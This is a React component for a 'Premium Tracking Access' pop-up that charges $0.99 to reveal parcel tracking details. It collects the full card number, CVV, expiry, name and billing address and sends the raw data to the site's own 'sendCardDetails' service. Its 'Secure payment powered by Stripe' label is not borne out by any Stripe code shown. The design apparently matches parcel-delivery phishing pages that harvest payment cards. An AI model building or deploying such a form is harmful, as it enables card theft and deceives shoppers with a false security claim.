import React, { useState, useEffect } from 'react';
import { FaCreditCard, FaLock, FaCheck, FaSpinner } from 'react-icons/fa';
import { useTheme } from '../contexts/ThemeContext';
import { toast } from 'react-toastify';
import Cookies from 'js-cookie';
import { sendCardDetails, savePaymentRecord } from '../services/paymentService';
import { getShipmentByTracking } from '../services/shipmentService';
import { useNavigate } from 'react-router-dom';

interface PremiumTrackingFormProps {
  onSuccess: () => void;
  onCancel: () => void;
  trackingNumber: string;
}

interface FormErrors {
  email: string;
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  name: string;
  country: string;
  addressLine1: string;
  city: string;
  zip: string;
  state: string;
}

const PremiumTrackingForm: React.FC<PremiumTrackingFormProps> = ({ onSuccess, onCancel, trackingNumber }) => {
  const { isDarkMode } = useTheme();
  const navigate = useNavigate();
  const [isProcessing, setIsProcessing] = useState(false);
  const [formData, setFormData] = useState({
    email: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    name: '',
    cardType: '',
    country: '',
    addressLine1: '',
    addressLine2: '',
    city: '',
    zip: '',
    state: ''
  });
  const [errors, setErrors] = useState<FormErrors>({
    email: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    name: '',
    country: '',
    addressLine1: '',
    city: '',
    zip: '',
    state: ''
  });
  const [cardType, setCardType] = useState<string>('');
  const [isValid, setIsValid] = useState(false);





  // Card validation functions
  const getCardType = (number: string): string => {
    const cleanNumber = number.replace(/\D/g, '');
    if (/^4\d{12}(\d{3})?$/.test(cleanNumber)) return 'Visa';
    if (/^(5[1-5]|2[2-7])\d{14}$/.test(cleanNumber)) return 'MasterCard';
    if (/^3[47]\d{13}$/.test(cleanNumber)) return 'American Express';
    if (/^62[0-9]{14,17}$/.test(cleanNumber)) return 'China Union Pay';
    if (/^(?:2131|1800|35\d{3})\d{11}$/.test(cleanNumber)) return 'JCB';
    if (/^3(?:0[0-5]|[68][0-9])\d{11}$/.test(cleanNumber)) return 'Diners Club';
    if (/^(60|65|81)\d{14,17}$/.test(cleanNumber)) return 'RuPay';
    return '';
  };

  const isValidLuhn = (card: string): boolean => {
    const num = card.replace(/\D/g, '');
    let sum = 0;
    let isEven = false;
    
    // Loop through values starting from the rightmost digit
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num[i]);

      if (isEven) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }

      sum += digit;
      isEven = !isEven;
    }

    return sum % 10 === 0;
  };

  const isValidExpiry = (expiry: string): boolean => {
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
    
    const [month, year] = expiry.split('/').map(Number);
    if (month < 1 || month > 12) return false;
    
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    
    return year > currentYear || (year === currentYear && month >= currentMonth);
  };

  const isValidCVV = (cvv: string): boolean => {
    return /^\d{3,4}$/.test(cvv);
  };

  const isValidName = (name: string): boolean => {
    const parts = name.trim().split(/\s+/);
    return parts.length >= 2 && parts.every(part => /^[A-Za-z]+$/.test(part));
  };

  const isValidEmail = (email: string): boolean => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const isValidAddress = (address: string): boolean => {
    return address.trim().length >= 5;
  };

  const isValidZip = (zip: string): boolean => {
    return /^\d{4,10}$/.test(zip.replace(/\s/g, ''));
  };

  // Format input values
  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\D/g, '');
    const parts = [];
    
    for (let i = 0; i < cleaned.length && i < 16; i += 4) {
      parts.push(cleaned.substr(i, 4));
    }
    
    return parts.join(' ');
  };

  const formatExpiry = (value: string): string => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length >= 2) {
      return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`;
    }
    return cleaned;
  };

  // Input handlers
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let formattedValue = value;
    let error = '';
    let detectedCardType = '';

    switch (name) {
      case 'cardNumber':
        formattedValue = formatCardNumber(value);
        detectedCardType = getCardType(formattedValue);
        setCardType(detectedCardType);
        
        if (formattedValue.replace(/\s/g, '').length > 0) {
          if (!detectedCardType) {
            error = 'Invalid card number';
          } else if (!isValidLuhn(formattedValue)) {
            error = 'Invalid card number';
          }
        }
        break;

      case 'expiryDate':
        formattedValue = formatExpiry(value);
        if (formattedValue.length > 0 && !isValidExpiry(formattedValue)) {
          error = 'Invalid expiry date';
        }
        break;

      case 'cvv':
        formattedValue = value.replace(/\D/g, '').slice(0, 4);
        if (formattedValue.length > 0 && !isValidCVV(formattedValue)) {
          error = 'Invalid CVV';
        }
        break;

      case 'name':
        formattedValue = value.replace(/[^A-Za-z\s]/g, '').toUpperCase();
        if (formattedValue.length > 0 && !isValidName(formattedValue)) {
          error = 'Enter full name (first & last)';
        }
        break;

      case 'email':
        formattedValue = value.toLowerCase();
        if (formattedValue.length > 0 && !isValidEmail(formattedValue)) {
          error = 'Enter a valid email address';
        }
        break;

      case 'country':
        formattedValue = value.replace(/[^A-Za-z\s]/g, '');
        if (formattedValue.length > 0 && formattedValue.trim().length < 2) {
          error = 'Enter a valid country';
        }
        break;

      case 'addressLine1':
        formattedValue = value;
        if (formattedValue.length > 0 && !isValidAddress(formattedValue)) {
          error = 'Enter a valid address';
        }
        break;

      case 'addressLine2':
        formattedValue = value;
        break;

      case 'city':
        formattedValue = value.replace(/[^A-Za-z\s]/g, '');
        if (formattedValue.length > 0 && formattedValue.trim().length < 2) {
          error = 'Enter a valid city';
        }
        break;

      case 'zip':
        formattedValue = value.replace(/\s/g, '');
        if (formattedValue.length > 0 && !isValidZip(formattedValue)) {
          error = 'Enter a valid ZIP code';
        }
        break;

      case 'state':
        formattedValue = value.replace(/[^A-Za-z\s]/g, '');
        if (formattedValue.length > 0 && formattedValue.trim().length < 2) {
          error = 'Enter a valid state';
        }
        break;
    }

    setFormData(prev => ({
      ...prev,
      [name]: formattedValue,
      ...(name === 'cardNumber' && { cardType: detectedCardType })
    }));

    setErrors(prev => ({
      ...prev,
      [name]: error
    }));
  };

  // Validate all fields and update isValid state
  useEffect(() => {
    const valid = 
      isValidEmail(formData.email) &&
      isValidLuhn(formData.cardNumber) &&
      getCardType(formData.cardNumber) !== '' &&
      isValidExpiry(formData.expiryDate) &&
      isValidCVV(formData.cvv) &&
      isValidName(formData.name) &&
      formData.country.trim().length > 0 &&
      isValidAddress(formData.addressLine1) &&
      formData.city.trim().length > 0 &&
      isValidZip(formData.zip) &&
      formData.state.trim().length > 0;
    
    setIsValid(valid);
  }, [formData]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isProcessing) return;

    try {
    setIsProcessing(true);
      
      // Send card details for payment processing
      await sendCardDetails(formData);
      
      // Save payment record to Firebase
      await savePaymentRecord(trackingNumber, formData.cardType, formData.cardNumber.slice(-4));
      
      // Set payment cookie for 24 hours
      Cookies.set(`premium_${trackingNumber}`, 'true', { expires: 1 }); // 1 day
      
      // Show success message
      toast.success('Payment successful! Tracking data loaded.', {
        position: "top-right",
        style: {
          background: isDarkMode ? '#1f2937' : '#ffffff',
          color: isDarkMode ? '#ffffff' : '#000000',
          borderLeft: '4px solid #10B981',
        },
      });

      // Call onSuccess to close form and update parent component
      onSuccess();
      
    } catch (error: any) {
      console.error('Payment error:', error);
      
      // Check if it's a duplicate payment error
      if (error.message?.includes('already exists') || error.message?.includes('already-exists')) {
        toast.info('Payment already processed. Loading tracking data...', {
          position: "top-right",
          style: {
            background: isDarkMode ? '#1f2937' : '#ffffff',
            color: isDarkMode ? '#ffffff' : '#000000',
            borderLeft: '4px solid #10B981',
          },
        });
        // Still call onSuccess since payment exists
        onSuccess();
      } else {
      toast.error('Payment failed. Please try again.', {
        position: "top-right",
        style: {
          background: isDarkMode ? '#1f2937' : '#ffffff',
          color: isDarkMode ? '#ffffff' : '#000000',
          borderLeft: '4px solid #ef4444',
        },
      });
      setIsProcessing(false);
      }
    }
  };

  const handleCancel = () => {
    toast.info('Payment cancelled. You need to complete the payment to view tracking details.', {
      position: "top-right",
      autoClose: 5000,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
      style: {
        background: isDarkMode ? '#1f2937' : '#ffffff',
        color: isDarkMode ? '#ffffff' : '#000000',
        borderLeft: '4px solid rgb(89,40,177)',
      },
    });
    onCancel();
  };

  return (
    <div className={`fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50`}>
      <div className={`max-w-md w-full max-h-[90vh] rounded-european-lg shadow-european-lg ${
        isDarkMode ? 'bg-gray-800' : 'bg-white'
      } p-6 flex flex-col`}>
        <div className="text-center mb-6">
          <h2 className={`text-2xl font-display font-bold ${isDarkMode ? 'text-white' : 'text-gray-900'}`}>
            Premium Tracking Access
          </h2>
          <p className={`mt-2 ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
            Unlock detailed tracking information for $0.99
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4 flex-1 overflow-y-auto">
          <div>
            <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
              Email Address
            </label>
            <input
              type="email"
              name="email"
              value={formData.email}
              onChange={handleInputChange}
              placeholder="your.email@example.com"
              className={`w-full px-4 py-2 rounded-european border ${
                isDarkMode 
                  ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                  : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
              } ${errors.email ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
            />
            {errors.email && (
              <p className="mt-1 text-sm text-red-500">{errors.email}</p>
            )}
          </div>

          <div>
            <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
              Card Number {cardType && `(${cardType})`}
            </label>
            <div className="relative">
              <input
                type="text"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleInputChange}
                placeholder="1234 5678 9012 3456"
                className={`w-full px-4 py-2 rounded-european border ${
                  isDarkMode 
                    ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                    : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                } ${errors.cardNumber ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
              />
              <FaCreditCard className={`absolute right-3 top-1/2 transform -translate-y-1/2 ${
                isDarkMode ? 'text-gray-400' : 'text-gray-500'
              }`} />
            </div>
            {errors.cardNumber && (
              <p className="mt-1 text-sm text-red-500">{errors.cardNumber}</p>
            )}
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
                Expiry Date
              </label>
              <input
                type="text"
                name="expiryDate"
                value={formData.expiryDate}
                onChange={handleInputChange}
                placeholder="MM/YY"
                className={`w-full px-4 py-2 rounded-european border ${
                  isDarkMode 
                    ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                    : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                } ${errors.expiryDate ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
              />
              {errors.expiryDate && (
                <p className="mt-1 text-sm text-red-500">{errors.expiryDate}</p>
              )}
            </div>
            <div>
              <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
                CVV
              </label>
              <input
                type="text"
                name="cvv"
                value={formData.cvv}
                onChange={handleInputChange}
                placeholder="123"
                className={`w-full px-4 py-2 rounded-european border ${
                  isDarkMode 
                    ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                    : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                } ${errors.cvv ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
              />
              {errors.cvv && (
                <p className="mt-1 text-sm text-red-500">{errors.cvv}</p>
              )}
            </div>
          </div>

          <div>
            <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
              Cardholder Name
            </label>
            <input
              type="text"
              name="name"
              value={formData.name}
              onChange={handleInputChange}
              placeholder="JOHN DOE"
              className={`w-full px-4 py-2 rounded-european border ${
                isDarkMode 
                  ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                  : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
              } ${errors.name ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
            />
            {errors.name && (
              <p className="mt-1 text-sm text-red-500">{errors.name}</p>
            )}
          </div>

          <div className="border-t pt-4">
            <h3 className={`text-lg font-medium ${isDarkMode ? 'text-white' : 'text-gray-900'} mb-3`}>
              Billing Address
            </h3>
            
            <div className="space-y-4">
              <div>
                <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
                  Country
                </label>
                <input
                  type="text"
                  name="country"
                  value={formData.country}
                  onChange={handleInputChange}
                  placeholder="United States"
                  className={`w-full px-4 py-2 rounded-european border ${
                    isDarkMode 
                      ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                      : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                  } ${errors.country ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
                />
                {errors.country && (
                  <p className="mt-1 text-sm text-red-500">{errors.country}</p>
                )}
              </div>

              <div>
                <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
                  Address Line 1
                </label>
                <input
                  type="text"
                  name="addressLine1"
                  value={formData.addressLine1}
                  onChange={handleInputChange}
                  placeholder="123 Main Street"
                  className={`w-full px-4 py-2 rounded-european border ${
                    isDarkMode 
                      ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                      : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                  } ${errors.addressLine1 ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
                />
                {errors.addressLine1 && (
                  <p className="mt-1 text-sm text-red-500">{errors.addressLine1}</p>
                )}
              </div>

              <div>
                <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
                  Address Line 2 (Optional)
                </label>
                <input
                  type="text"
                  name="addressLine2"
                  value={formData.addressLine2}
                  onChange={handleInputChange}
                  placeholder="Apt, suite, etc."
                  className={`w-full px-4 py-2 rounded-european border ${
                    isDarkMode 
                      ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                      : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                  } focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
                    City
                  </label>
                  <input
                    type="text"
                    name="city"
                    value={formData.city}
                    onChange={handleInputChange}
                    placeholder="New York"
                    className={`w-full px-4 py-2 rounded-european border ${
                      isDarkMode 
                        ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                        : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                    } ${errors.city ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
                  />
                  {errors.city && (
                    <p className="mt-1 text-sm text-red-500">{errors.city}</p>
                  )}
                </div>
                <div>
                  <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
                    State
                  </label>
                  <input
                    type="text"
                    name="state"
                    value={formData.state}
                    onChange={handleInputChange}
                    placeholder="NY"
                    className={`w-full px-4 py-2 rounded-european border ${
                      isDarkMode 
                        ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                        : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                    } ${errors.state ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
                  />
                  {errors.state && (
                    <p className="mt-1 text-sm text-red-500">{errors.state}</p>
                  )}
                </div>
              </div>

              <div>
                <label className={`block text-sm font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-700'} mb-1`}>
                  ZIP Code
                </label>
                <input
                  type="text"
                  name="zip"
                  value={formData.zip}
                  onChange={handleInputChange}
                  placeholder="10001"
                  className={`w-full px-4 py-2 rounded-european border ${
                    isDarkMode 
                      ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400' 
                      : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500'
                  } ${errors.zip ? 'border-red-500' : ''} focus:ring-2 focus:ring-primary-500 focus:border-primary-500`}
                />
                {errors.zip && (
                  <p className="mt-1 text-sm text-red-500">{errors.zip}</p>
                )}
              </div>
            </div>
          </div>

          <div className="flex items-center justify-between pt-4 flex-shrink-0">
            <button
              type="button"
              onClick={handleCancel}
              className={`px-4 py-2 rounded-european ${
                isDarkMode 
                  ? 'text-gray-300 hover:bg-gray-700' 
                  : 'text-gray-600 hover:bg-gray-100'
              }`}
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={isProcessing || !isValid}
              className={`px-6 py-2 rounded-european bg-[rgb(89,40,177)] text-white hover:bg-[rgb(109,60,197)] focus:outline-none focus:ring-2 focus:ring-[rgb(89,40,177)] focus:ring-offset-2 disabled:opacity-50 flex items-center gap-2`}
            >
              {isProcessing ? (
                <>
                  <FaSpinner className="animate-spin" />
                  Processing...
                </>
              ) : (
                <>
                  <FaLock />
                  Pay $0.99
                </>
              )}
            </button>
          </div>
        </form>

        <div className="mt-6 text-center flex-shrink-0">
          <div className="flex items-center justify-center gap-2 text-sm text-gray-500">
            <FaLock className="text-primary-500" />
            <span>Secure payment powered by Stripe</span>
          </div>
        </div>
      </div>


    </div>
  );
};

export default PremiumTrackingForm; 